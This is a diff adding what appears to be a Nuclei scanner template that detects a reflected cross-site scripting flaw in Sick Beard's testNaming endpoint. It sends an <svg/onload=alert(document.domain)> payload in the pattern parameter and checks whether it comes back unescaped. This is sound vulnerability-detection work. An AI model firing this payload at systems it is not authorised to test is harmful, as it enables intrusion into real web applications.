@@ -1,0 +1,23 @@
+id: sick-beard-xss
+info:
+  author: pikpikcu
+  name: Sick Beard XSS
+  severity: medium
+  tags: xss
+requests:
+- matchers:
+  - status:
+    - 200
+    type: status
+  - part: body
+    type: word
+    words:
+    - <svg/onload=alert(document.domain)>
+  - part: header
+    type: word
+    words:
+    - text/html
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/config/postProcessing/testNaming?pattern=%3Csvg/onload=alert(document.domain)%3E'
